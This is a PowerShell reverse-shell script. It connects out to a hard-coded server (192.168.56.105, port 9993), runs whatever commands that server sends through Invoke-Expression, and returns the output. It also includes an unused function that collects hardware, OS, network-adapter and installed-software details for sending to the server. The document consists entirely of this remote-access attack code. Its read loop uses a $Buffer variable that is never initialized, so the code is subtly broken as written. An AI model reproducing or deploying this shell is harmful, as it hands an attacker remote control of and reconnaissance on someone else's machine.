# Define the server's IP address and port
$SERVER_HOST = "192.168.56.105"  # Replace with the server's IP address
$SERVER_PORT = 9993

# Create a TCP client object
$tcpClient = New-Object System.Net.Sockets.TcpClient

# Connect to the server
$tcpClient.Connect($SERVER_HOST, $SERVER_PORT)

# Create a stream object for sending and receiving data
$stream = $tcpClient.GetStream()
$writer = [System.IO.StreamWriter]::new($stream)
$reader = [System.IO.StreamReader]::new($stream)

# Function to write a string to the server
function WriteToStream ($String) {
    # Write to the server
    $writer.WriteLine($String)
    $writer.Flush()
}

# Function to execute commands and send output to the server
function ExecuteCommandAndSendOutput($Command) {
    # Execute command and save output (including errors thrown)
    $Output = try {
        Invoke-Expression $Command 2>&1 | Out-String
    } catch {
        $_ | Out-String
    }
    
    # Write output to the server
    WriteToStream ($Output)
}

# Function to gather system information and send to server
function GatherAndSendSystemInfo() {
    # Get system information
    $systemInfo = Get-WmiObject Win32_ComputerSystem
    $osInfo = Get-WmiObject Win32_OperatingSystem
    $cpuInfo = Get-WmiObject Win32_Processor
    $memoryInfo = Get-WmiObject Win32_PhysicalMemory

    # Get network information
    $networkInfo = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }

    # Get installed software information
    $installedSoftware = Get-WmiObject Win32_Product | Select-Object Name, Version

    # Construct system information message
    $systemInfoMsg = @"
System Information:
  Model: $($systemInfo.Model)
  Manufacturer: $($systemInfo.Manufacturer)
  OS: $($osInfo.Caption) $($osInfo.Version)
  CPU: $($cpuInfo.Name)
  Memory: $($memoryInfo.Capacity / 1GB) GB

Network Information:
"@
    foreach ($adapter in $networkInfo) {
        $systemInfoMsg += "  Adapter: $($adapter.Description)`n"
        $systemInfoMsg += "    IP Address: $($adapter.IPAddress)`n"
    }

    $systemInfoMsg += "`nInstalled Software:`n"
    foreach ($software in $installedSoftware) {
        $systemInfoMsg += "  $($software.Name) $($software.Version)`n"
    }

    # Send system information to server
    WriteToStream $systemInfoMsg
}

# Initial output to the server
WriteToStream ""

# Loop that breaks if stream.Read throws an exception - will happen if connection is closed.
while(($BytesRead = $stream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Encode command, remove last byte/newline
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    
    # Execute command and send output to the server
    ExecuteCommandAndSendOutput $Command
}

# Close the writer and the underlying TCPClient
$writer.Close()
